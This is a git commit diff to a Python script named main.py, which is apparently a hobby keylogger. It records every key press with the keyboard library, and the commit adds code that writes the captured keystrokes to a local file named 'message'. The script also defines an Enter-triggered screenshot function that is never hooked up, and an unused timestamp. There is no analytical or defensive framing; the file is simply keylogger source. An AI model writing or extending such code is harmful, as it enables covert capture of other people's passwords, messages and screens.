fbe0643679f80cf809b0b2e2915927eebb962c6b
Cooper <79376063+Cooper14052@users.noreply.github.com>
2023-10-05 14:10:58 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,7 @@
 import keyboard
 from PIL import ImageGrab
+import datetime
+
 
 def keylogger():
     text = ''
@@ -8,15 +10,21 @@ def keylogger():
         if event.event_type == "down":
             text += event.name
             print(text)
+            time_session = datetime.datetime.now()
+            with open(f"message", "w") as file:
+                file.write(text)
+
 
 def take_screenshot():
     screenshot = ImageGrab.grab()
     screenshot.save("screenshot.png")
     print("Скриншот сохранен")
 
+
 def on_key(event):
     if event.name == "enter":
         take_screenshot()
+
 
 if __name__ == '__main__':
     keylogger()
